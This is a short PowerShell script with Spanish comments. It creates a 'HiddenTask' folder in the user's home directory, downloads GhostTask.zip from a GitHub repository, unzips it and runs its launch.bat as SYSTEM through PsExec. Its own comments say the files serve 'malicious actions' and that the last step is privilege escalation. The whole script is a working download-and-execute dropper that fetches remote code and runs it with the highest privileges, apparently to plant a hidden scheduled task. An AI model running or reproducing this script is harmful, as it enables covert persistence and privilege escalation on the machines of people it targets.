# Obtener la ruta del directorio del usuario actual
$directorioTemporal = $env:HOMEPATH

# Crear el directorio donde se van a descargar los archivos necesarios para ejecutar las acciones maliciosas
$workingPath = "HiddenTask"
$nuevaRuta = Join-Path -Path $directorioTemporal -ChildPath $workingPath

if (-not (Test-Path -Path $nuevaRuta)) {
    New-Item -ItemType Directory -Path $nuevaRuta -ErrorAction SilentlyContinue
}

# Descargar el archivo de GitHub
$urlArchivoMal = "https://github.com/taysec/Test_HiddenTask/raw/main/HiddenTask%20with%20GhostTask/GhostTask.zip"
$fileName = "GhostTask.zip"
$rutaArchivo = Join-Path -Path $nuevaRuta -ChildPath $fileName

Invoke-WebRequest -Uri $urlArchivoMal -OutFile $rutaArchivo

# Descomprimir el archivo
$rutaDescompresion = Join-Path -Path $nuevaRuta -ChildPath "Descomprimido"

Expand-Archive -Path $rutaArchivo -DestinationPath $rutaDescompresion -ErrorAction SilentlyContinue

# Elevación de privilegios a través de psexec ejecutando lanzador de GhostTask
$psExec = Join-Path -Path $rutaDescompresion -ChildPath "PsExec.exe"
$batExec = Join-Path -Path $rutaDescompresion -ChildPath "launch.bat"

Start-Process -FilePath $psExec -ArgumentList "-accepteula", "-i", "-s", $batExec -Verb "runas"
